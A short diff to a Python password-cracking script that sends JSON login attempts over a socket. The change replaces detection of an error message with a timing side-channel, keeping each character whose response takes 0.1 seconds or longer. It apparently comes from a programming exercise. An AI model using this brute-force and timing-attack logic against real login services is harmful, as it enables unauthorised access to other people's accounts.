@@ -4,6 +4,7 @@ import json
 import sys
 import socket
 import string
+import time
 
 
 def get_login(sock, logins):
@@ -25,10 +26,12 @@ def crack(hostname, port, logins):
         while True:
             for char in letters:
                 sock.send(json.dumps({"login": login, "password": password + char}).encode())
+                sent = time.time()
                 res = sock.recv(1024).decode()
+                received = time.time()
                 res = json.loads(res)
                 if "result" in res:
-                    if res["result"] == "Exception happened during login":
+                    if received - sent >= 0.1:
                         password += char
                         break
                     elif res["result"] == "Connection success!":
